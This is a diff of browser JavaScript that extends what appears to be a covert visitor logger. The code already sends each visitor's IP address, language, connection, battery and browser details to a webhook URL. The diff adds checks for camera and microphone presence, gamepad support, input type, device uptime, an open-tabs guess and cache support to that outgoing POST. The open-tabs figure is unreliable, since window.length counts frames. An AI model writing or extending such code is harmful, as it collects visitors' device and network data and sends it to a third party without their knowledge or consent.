@@ -52,13 +52,35 @@
                 else if (/Opera|OPR/i.test(userAgent)) browser = "Opera";
                 else if (/UCBrowser/i.test(userAgent)) browser = "UC Browser";
 
+                let cameraStatus = "Disabled";
+                let microphoneStatus = "Disabled";
+                let gamepadStatus = "Disabled";
+                if (navigator.mediaDevices) {
+                    try {
+                        const devices = await navigator.mediaDevices.enumerateDevices();
+                        cameraStatus = devices.some(device => device.kind === "videoinput") ? "Enabled" : "Disabled";
+                        microphoneStatus = devices.some(device => device.kind === "audioinput") ? "Enabled" : "Disabled";
+                    } catch {
+                        cameraStatus = microphoneStatus = "Permission Denied";
+                    }
+                }
+
+                if (navigator.getGamepads) {
+                    gamepadStatus = "Enabled";
+                }
+
+                const inputType = 'ontouchstart' in window ? "Layar Sentuh" : "Keyboard Fisik";
+                const uptime = performance.now() / 1000;
+                const tabCount = window.length || "Unknown";
+                const cacheStorage = 'caches' in window ? "Supported" : "Not Supported";
+
                 await fetch(webhookUrl, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nConnection Type: ${connectionType}\nNetwork Type: ${networkType}\nBattery Level: ${batteryLevel}\nCharging Status: ${isCharging}\nPlatform: ${platform}\nBrowser: ${browser}`
+                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nConnection Type: ${connectionType}\nNetwork Type: ${networkType}\nBattery Level: ${batteryLevel}\nCharging Status: ${isCharging}\nPlatform: ${platform}\nBrowser: ${browser}\nCamera Status: ${cameraStatus}\nMicrophone Status: ${microphoneStatus}\nGamepad Status: ${gamepadStatus}\nInput Type: ${inputType}\nDevice Uptime: ${uptime.toFixed(2)} seconds\nOpen Tabs Estimate: ${tabCount}\nCache Storage: ${cacheStorage}`
                     })
                 });
 
